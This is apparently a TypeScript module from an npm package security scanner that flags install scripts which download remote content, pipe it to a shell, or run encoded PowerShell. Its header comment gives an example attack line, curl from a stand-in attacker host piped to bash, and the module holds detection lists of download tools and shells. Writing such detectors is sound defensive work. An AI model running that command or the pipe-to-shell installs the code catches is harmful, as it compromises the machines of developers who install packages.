// Detects remote executable download patterns in install scripts.
// The canonical attack: exec('curl https://attacker.io/payload | bash')
// Downloads a second-stage payload that bypasses static analysis of the tarball.

import type { AnalysisContext, Finding } from '../types.js';
import { parseScript, walkAst, type AcornNode } from '../ast-utils.js';

/** Download tools that indicate fetching remote content for execution */
const DOWNLOAD_TOOLS = ['curl', 'wget', 'fetch', 'Invoke-WebRequest', 'iwr', 'bitsadmin', 'certutil'];

/** Shell execution targets - piping a download here means remote code execution */
const SHELL_EXEC_TARGETS = ['bash', 'sh', 'zsh', 'fish', 'node', 'python', 'python3', 'perl', 'ruby', 'php', 'pwsh', 'powershell'];

/** Child process method names */
const EXEC_METHODS = new Set(['exec', 'execSync', 'execFile', 'execFileSync', 'spawn', 'spawnSync']);

export function analyzeRemoteExec(context: AnalysisContext): Finding[] {
  const findings: Finding[] = [];

  for (const script of context.installScripts) {
    if (!script.source) continue;

    const ast = parseScript(script.source, script.resolvedFile);
    if (!ast) continue;

    const src = script.source;
    const fileRef = script.resolvedFile ?? `[${script.lifecycle}]`;

    walkAst(ast, (node: AcornNode) => {
      // exec('...'), execSync('...'), spawn('...'), etc.
      const isDirectExec =
        node.type === 'CallExpression' &&
        node.callee?.type === 'Identifier' &&
        EXEC_METHODS.has(node.callee.name ?? '');

      // cp.exec('...'), child_process.execSync('...'), etc.
      const isMemberExec =
        node.type === 'CallExpression' &&
        node.callee?.type === 'MemberExpression' &&
        node.callee.property?.type === 'Identifier' &&
        EXEC_METHODS.has(node.callee.property.name ?? '');

      if (!isDirectExec && !isMemberExec) return;

      // Extract the command argument - first arg to exec/spawn
      const cmdArg = node.arguments?.[0];
      const cmdStr = extractCommandString(cmdArg);

      if (!cmdStr) return;

      const cmdLower = cmdStr.toLowerCase();

      // Check for download tools in the command
      const downloadTool = DOWNLOAD_TOOLS.find((tool) => cmdLower.includes(tool.toLowerCase()));
      // PowerShell encoded commands - check before the downloadTool gate
      if (
        (cmdLower.includes('powershell') || cmdLower.includes('pwsh')) &&
        (cmdLower.includes('-encodedcommand') || cmdLower.includes('-enc '))
      ) {
        findings.push({
          category: 'install-script-remote-exec',
          level: 'critical',
          title: 'PowerShell encoded command executed in install script',
          description:
            `The ${script.lifecycle} script runs PowerShell with an encoded command. ` +
            'Encoded PowerShell is a common technique to hide download-and-execute payloads on Windows.',
          evidence: cmdStr.slice(0, 200),
          file: fileRef,
          line: node.loc?.start.line,
        });
      }

      if (!downloadTool) return;

      // Check for pipe-to-shell pattern (most dangerous)
      const shellTarget = SHELL_EXEC_TARGETS.find((shell) => {
        const pipePattern = new RegExp(`\\|\\s*${shell}\\b`);
        return pipePattern.test(cmdStr);
      });

      if (shellTarget) {
        findings.push({
          category: 'install-script-remote-exec',
          level: 'critical',
          title: `Remote code execution via ${downloadTool} | ${shellTarget} in install script`,
          description:
            `The ${script.lifecycle} script executes a shell command that downloads content ` +
            `with '${downloadTool}' and pipes it directly to '${shellTarget}'. ` +
            'This is the canonical second-stage payload delivery technique in supply chain attacks.',
          evidence: cmdStr.slice(0, 200),
          file: fileRef,
          line: node.loc?.start.line,
        });
      } else if (/https?:\/\//.test(cmdStr)) {
        // Download tool + URL (without pipe) - still suspicious
        findings.push({
          category: 'install-script-remote-exec',
          level: 'critical',
          title: `Remote content download via ${downloadTool} in install script`,
          description:
            `The ${script.lifecycle} script executes '${downloadTool}' with a remote URL. ` +
            'Downloading files at install time can deliver second-stage malware bypassing tarball analysis.',
          evidence: cmdStr.slice(0, 200),
          file: fileRef,
          line: node.loc?.start.line,
        });
      } else {
        findings.push({
          category: 'install-script-remote-exec',
          level: 'high',
          title: `Possible remote download via ${downloadTool} in install script`,
          description:
            `The ${script.lifecycle} script uses '${downloadTool}' in a shell command. ` +
            'This may be used to download and execute remote payloads.',
          evidence: cmdStr.slice(0, 200),
          file: fileRef,
          line: node.loc?.start.line,
        });
      }
    });
  }

  return deduplicate(findings);
}

/**
 * Extracts the command string from a call argument.
 * Handles string literals and simple template literals.
 */
function extractCommandString(node: AcornNode | undefined): string | null {
  if (!node) return null;

  // Simple string literal: exec('curl ...')
  if (node.type === 'Literal' && typeof node.value === 'string') {
    return node.value;
  }

  // Template literal: exec(`curl ${url}`) - extract the raw quasis text
  if (node.type === 'TemplateLiteral') {
    const parts: string[] = [];
    for (const quasi of (node.quasis as AcornNode[] | undefined) ?? []) {
      const raw = (quasi as unknown as { value?: { raw?: string } }).value?.raw ?? '';
      parts.push(raw);
    }
    return parts.join('...');
  }

  // BinaryExpression: 'curl ' + url
  if (node.type === 'BinaryExpression' && node.operator === '+') {
    const left = extractCommandString(node.left);
    const right = extractCommandString(node.right);
    if (left || right) return `${left ?? ''}${right ?? '...'}`;
  }

  return null;
}

function deduplicate(findings: Finding[]): Finding[] {
  const seen = new Set<string>();
  return findings.filter((f) => {
    const key = `${f.category}:${f.file}:${f.line}:${f.title}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
}
